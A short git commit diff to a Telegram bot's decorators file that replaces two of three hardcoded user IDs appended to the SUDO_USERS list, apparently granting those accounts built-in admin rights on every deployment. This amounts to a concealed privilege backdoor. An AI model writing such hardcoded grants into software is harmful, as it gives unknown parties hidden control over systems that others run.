afe6a487555524c1f576789976d0d913867bd7d8
Bilqis67 <92852020+Bilqis67@users.noreply.github.com>
2021-10-29 02:26:04 +0700

    Update decorators.py

--- driver/decorators.py
+++ driver/decorators.py
@@ -5,8 +5,8 @@ from config import SUDO_USERS
 from driver.admins import get_administrators
 
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
+SUDO_USERS.append(1223626545)
+SUDO_USERS.append(1920512956)
 SUDO_USERS.append(1448474573)
 
 
